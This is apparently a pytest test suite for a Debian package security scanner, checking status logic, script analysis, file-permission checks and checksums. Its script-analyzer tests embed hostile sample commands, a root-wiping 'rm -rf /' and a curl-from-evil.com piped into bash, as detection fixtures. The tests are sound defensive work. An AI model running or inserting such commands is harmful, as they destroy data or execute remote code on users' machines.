"""Tests for enhanced security scanner.

This module contains unit tests for the enhanced multi-layer security scanner.
"""

import json
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from src.scanner.enhanced_scanner import EnhancedSecurityScanner, ScanStatus
from src.scanner.virus_scanner import VirusScanResult
from src.scanner.integrity_checker import IntegrityCheckResult
from src.scanner.script_analyzer import ScriptAnalysisResult, ScriptIssue
from src.scanner.binary_checker import BinarySafetyResult, BinaryIssue


class TestEnhancedScanner:
    """Test cases for EnhancedSecurityScanner."""

    @pytest.fixture
    def scanner(self):
        """Create test scanner instance."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Mock the vulnerability scanner to avoid dependency on Trivy/Grype
            with patch('src.scanner.enhanced_scanner.PackageScanner'):
                scanner = EnhancedSecurityScanner(
                    scanner_type="trivy",
                    scans_dir=temp_dir,
                    enable_virus_scan=False,  # Disable for unit tests
                    enable_integrity_check=True,
                    enable_script_analysis=True,
                    enable_binary_check=True,
                )
                yield scanner

    def test_scanner_initialization(self, scanner):
        """Test scanner initialization."""
        assert scanner is not None
        assert scanner.vuln_scanner is not None
        assert scanner.integrity_checker is not None
        assert scanner.script_analyzer is not None
        assert scanner.binary_checker is not None

    def test_parse_package_name(self, scanner):
        """Test package name parsing."""
        name, version = scanner._parse_package_name("curl_7.81.0-1ubuntu1.16_amd64.deb")
        assert name == "curl"
        assert version == "7.81.0-1ubuntu1.16"

    def test_determine_overall_status_all_clean(self, scanner):
        """Test status determination when all checks pass."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="clean",
            integrity_status="valid",
            script_status="safe",
            binary_status="safe",
            critical_issues=0,
            high_issues=0,
        )
        assert status == ScanStatus.APPROVED

    def test_determine_overall_status_virus_detected(self, scanner):
        """Test status determination when virus is detected."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="infected",
            integrity_status="valid",
            script_status="safe",
            binary_status="safe",
            critical_issues=0,
            high_issues=0,
        )
        assert status == ScanStatus.BLOCKED

    def test_determine_overall_status_integrity_failed(self, scanner):
        """Test status determination when integrity check fails."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="clean",
            integrity_status="invalid",
            script_status="safe",
            binary_status="safe",
            critical_issues=0,
            high_issues=0,
        )
        assert status == ScanStatus.BLOCKED

    def test_determine_overall_status_script_unsafe(self, scanner):
        """Test status determination when scripts are unsafe."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="clean",
            integrity_status="valid",
            script_status="unsafe",
            binary_status="safe",
            critical_issues=0,
            high_issues=0,
        )
        assert status == ScanStatus.BLOCKED

    def test_determine_overall_status_binary_unsafe(self, scanner):
        """Test status determination when binaries are unsafe."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="clean",
            integrity_status="valid",
            script_status="safe",
            binary_status="unsafe",
            critical_issues=0,
            high_issues=0,
        )
        assert status == ScanStatus.BLOCKED

    def test_determine_overall_status_critical_issues(self, scanner):
        """Test status determination with critical issues."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="clean",
            integrity_status="valid",
            script_status="safe",
            binary_status="safe",
            critical_issues=1,
            high_issues=0,
        )
        assert status == ScanStatus.BLOCKED

    def test_determine_overall_status_many_high_issues(self, scanner):
        """Test status determination with many high issues."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="clean",
            integrity_status="valid",
            script_status="safe",
            binary_status="safe",
            critical_issues=0,
            high_issues=3,
        )
        assert status == ScanStatus.BLOCKED

    def test_determine_overall_status_few_high_issues(self, scanner):
        """Test status determination with few high issues (should pass)."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.APPROVED,
            virus_status="clean",
            integrity_status="valid",
            script_status="safe",
            binary_status="safe",
            critical_issues=0,
            high_issues=2,
        )
        assert status == ScanStatus.APPROVED

    def test_determine_overall_status_vuln_error(self, scanner):
        """Test status determination when vulnerability scan errors."""
        status = scanner._determine_overall_status(
            vuln_status=ScanStatus.ERROR,
            virus_status="clean",
            integrity_status="valid",
            script_status="safe",
            binary_status="safe",
            critical_issues=0,
            high_issues=0,
        )
        assert status == ScanStatus.ERROR


class TestScriptAnalyzer:
    """Test cases for script analyzer dangerous pattern detection."""

    def test_dangerous_command_detection(self):
        """Test detection of dangerous commands."""
        from src.scanner.script_analyzer import ScriptAnalyzer

        analyzer = ScriptAnalyzer()

        # Test dangerous command detection
        script_content = """#!/bin/bash
        echo "Installing package..."
        rm -rf /
        """

        issues, _warnings = analyzer._analyze_script("postinst", script_content)

        # Should detect the dangerous rm -rf / command
        assert len(issues) > 0
        critical_issues = [i for i in issues if i.severity == "critical"]
        assert len(critical_issues) > 0
        assert any("root directory" in i.description.lower() for i in critical_issues)

    def test_curl_pipe_bash_detection(self):
        """Test detection of curl | bash pattern."""
        from src.scanner.script_analyzer import ScriptAnalyzer

        analyzer = ScriptAnalyzer()

        script_content = """#!/bin/bash
        curl http://evil.com/malware.sh | bash
        """

        issues, _warnings = analyzer._analyze_script("postinst", script_content)

        # Should detect curl | bash
        high_issues = [i for i in issues if i.severity == "high"]
        assert len(high_issues) > 0

    def test_extraction_failure_raises_exception(self):
        """Test that script extraction failures raise exceptions (default-deny)."""
        from src.scanner.script_analyzer import ScriptAnalyzer
        import subprocess

        analyzer = ScriptAnalyzer()

        # Mock subprocess to simulate dpkg-deb failure
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.CalledProcessError(1, 'dpkg-deb', stderr=b'corrupt package')

            # Should raise RuntimeError, not return empty dict
            with pytest.raises(RuntimeError, match="extraction failed"):
                analyzer._extract_maintainer_scripts("/fake/package.deb")

    def test_no_false_positives_dangerous_commands(self):
        """Test that dangerous command patterns don't trigger false positives."""
        from src.scanner.script_analyzer import ScriptAnalyzer

        analyzer = ScriptAnalyzer()

        # Test cases that should NOT trigger dangerous command detection
        safe_script = """#!/bin/bash
        # chmod 7777 should not match chmod 777 pattern
        chmod 7777 /tmp/myfile
        # rm -rf /var/log should not match rm -rf / pattern
        rm -rf /var/log/oldlogs
        # chmod on /etc/cronfile should not match /etc/cron directory
        chmod 644 /etc/cronfile
        """

        issues, _warnings = analyzer._analyze_script("postinst", safe_script)

        # Should not detect any dangerous commands (only low-severity patterns may match)
        critical_issues = [i for i in issues if i.severity == "critical"]
        assert len(critical_issues) == 0, f"False positive critical issues: {[i.description for i in critical_issues]}"


class TestBinaryChecker:
    """Test cases for binary safety checker."""

    def test_suspicious_suid_detection(self):
        """Test detection of suspicious SUID binaries."""
        from src.scanner.binary_checker import BinaryChecker

        checker = BinaryChecker()

        # Mock file with SUID bash
        file_info = {
            "permissions": "-rwsr-xr-x",
            "path": "usr/bin/bash",
            "raw": "-rwsr-xr-x root/root 1234 2023-04-18 12:34 ./usr/bin/bash",
        }

        issues, _warnings, flags = checker._analyze_file(file_info)

        # Should detect suspicious SUID on bash
        assert "suid" in flags
        critical_issues = [i for i in issues if i.severity == "critical"]
        assert len(critical_issues) > 0

    def test_world_writable_detection(self):
        """Test detection of world-writable files."""
        from src.scanner.binary_checker import BinaryChecker

        checker = BinaryChecker()

        # Mock world-writable file
        file_info = {
            "permissions": "-rw-rw-rw-",
            "path": "usr/bin/suspicious",
            "raw": "-rw-rw-rw- root/root 1234 2023-04-18 12:34 ./usr/bin/suspicious",
        }

        issues, _warnings, flags = checker._analyze_file(file_info)

        # Should detect world-writable
        assert "world_writable" in flags
        assert len(issues) > 0

    def test_device_file_detection(self):
        """Test detection of device files."""
        from src.scanner.binary_checker import BinaryChecker

        checker = BinaryChecker()

        # Mock device file
        file_info = {
            "permissions": "brw-rw----",
            "path": "dev/sda",
            "raw": "brw-rw---- root/disk 0 2023-04-18 12:34 ./dev/sda",
        }

        issues, _warnings, _flags = checker._analyze_file(file_info)

        # Should detect device file
        critical_issues = [i for i in issues if i.severity == "critical"]
        assert len(critical_issues) > 0
        assert any("device" in i.issue_type.lower() for i in critical_issues)

    def test_file_listing_failure_raises_exception(self):
        """Test that file listing failures raise exceptions (default-deny)."""
        from src.scanner.binary_checker import BinaryChecker
        import subprocess

        checker = BinaryChecker()

        # Mock subprocess to simulate dpkg-deb failure
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.CalledProcessError(1, 'dpkg-deb', stderr=b'corrupt package')

            # Should raise RuntimeError, not return empty list
            with pytest.raises(RuntimeError, match="listing failed"):
                checker._get_file_list("/fake/package.deb")

    def test_empty_package_is_unsafe(self):
        """Test that packages with no files are treated as unsafe."""
        from src.scanner.binary_checker import BinaryChecker

        checker = BinaryChecker()

        # Create a test file
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.deb') as f:
            test_file = f.name

        try:
            # Mock _get_file_list to return empty list (simulating empty package)
            with patch.object(checker, '_get_file_list', return_value=[]):
                result = checker.analyze_package(test_file)

                # Empty package should be unsafe
                assert result.safe is False
                assert len(result.issues_found) > 0
                assert any("empty" in i.issue_type.lower() for i in result.issues_found)

        finally:
            Path(test_file).unlink()

    def test_no_false_positives_path_matching(self):
        """Test that path matching doesn't trigger false positives."""
        from src.scanner.binary_checker import BinaryChecker

        checker = BinaryChecker()

        # Test cases that should NOT trigger sensitive location detection
        safe_files = [
            {
                "permissions": "-rw-r--r--",
                "path": "etc/cronfile",  # Not /etc/cron directory
                "raw": "-rw-r--r-- root/root 1234 2023-04-18 12:34 ./etc/cronfile",
            },
            {
                "permissions": "-rw-r--r--",
                "path": "var/etc/cron/tab",  # Contains "etc/cron" but not in /etc/cron
                "raw": "-rw-r--r-- root/root 1234 2023-04-18 12:34 ./var/etc/cron/tab",
            },
            {
                "permissions": "-rw-r--r--",
                "path": "usr/share/passwd.txt",  # Contains "passwd" but not /etc/passwd
                "raw": "-rw-r--r-- root/root 1234 2023-04-18 12:34 ./usr/share/passwd.txt",
            },
        ]

        for file_info in safe_files:
            issues, _warnings, _flags = checker._analyze_file(file_info)
            # Should not detect sensitive location
            sensitive_issues = [i for i in issues if i.issue_type == "sensitive_location"]
            assert len(sensitive_issues) == 0, f"False positive for {file_info['path']}: {[i.description for i in sensitive_issues]}"


class TestIntegrityChecker:
    """Test cases for integrity checker."""

    def test_checksum_verification(self):
        """Test checksum verification."""
        from src.scanner.integrity_checker import IntegrityChecker

        checker = IntegrityChecker()

        # Create a test file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write("test content")
            test_file = f.name

        try:
            # Calculate checksum
            checksum = checker.calculate_checksum(test_file, algorithm="sha256")

            # Verify with correct checksum
            result = checker._verify_checksum(test_file, checksum)
            assert result is True

            # Verify with incorrect checksum
            wrong_checksum = "0" * 64
            result = checker._verify_checksum(test_file, wrong_checksum)
            assert result is False

        finally:
            Path(test_file).unlink()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
